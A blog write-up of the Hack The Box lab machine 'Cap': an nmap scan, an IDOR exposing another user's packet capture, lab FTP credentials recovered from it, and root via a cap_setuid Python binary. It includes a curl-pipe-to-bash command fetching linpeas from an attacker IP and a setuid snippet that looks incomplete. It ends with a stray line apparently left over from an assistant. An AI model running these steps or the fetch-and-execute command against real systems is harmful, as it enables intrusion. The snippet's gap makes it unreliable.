---
layout: single
title: Cap - Hack The Box
excerpt: ""
date: 2024-10-08
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-writeup/
  teaser_home_page: true
  icon: /blog/assets/images/hackthebox.webp
categories:
  - WriteUp
---


## Synopsis

Cap is an easy Linux machine running an HTTP server that performs administrative functions, including network captures. Improper controls lead to an Insecure Direct Object Reference (IDOR) vulnerability, allowing access to another user's capture. The capture contains plaintext credentials, which can be used to gain initial access. A Linux capability is then exploited to escalate privileges to root.

## Skills Required
- Web enumeration  
- Packet capture analysis  

## Skills Learned
- Exploiting IDOR vulnerabilities  
- Leveraging Linux capabilities  

## Enumeration

### Nmap Scan

ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245


Nmap reveals three open ports:
- **FTP (21)**
- **SSH (22)**
- **HTTP (80)**

### FTP
Anonymous access is disabled. Moving on to the HTTP server.

### HTTP
Port 80 runs Gunicorn, a Python-based HTTP server. The dashboard reveals administrative functions:
- **IP Config:** Displays `ifconfig` output.
- **Network Status:** Displays `netstat` output.
- **Security Snapshot:** Captures network traffic and provides a downloadable `.pcap` file.


## Exploitation

### Insecure Direct Object Reference (IDOR)
The URL scheme for packet captures is `/data/<id>`. By manually accessing `/data/0`, we retrieve a packet capture from another user.

### Foothold
Analyzing the capture in Wireshark reveals FTP traffic, including plaintext credentials:
- **Username:** nathan  
- **Password:** Buck3tH4TF0RM3!  

These credentials are valid for both FTP and SSH, granting access to the machine.


## Privilege Escalation

### Linux Capabilities
Running `linPEAS` reveals that `/usr/bin/python3.8` has the `cap_setuid` capability, allowing privilege escalation.

### Exploiting `cap_setuid`
The following Python code escalates to root:
import os
os.setuid(0)


### Steps:
1. Download `linpeas.sh` to the target machine:
   curl http://10.10.14.24/linpeas.sh | bash
   
2. Execute the Python payload to gain a root shell.

---

## Conclusion
Cap demonstrates the dangers of insecure access controls and misconfigured Linux capabilities. By exploiting IDOR and leveraging `cap_setuid`, we escalate from a low-privileged user to root.

--- 

This writeup is concise, structured, and highlights the key steps and vulnerabilities exploited during the penetration test.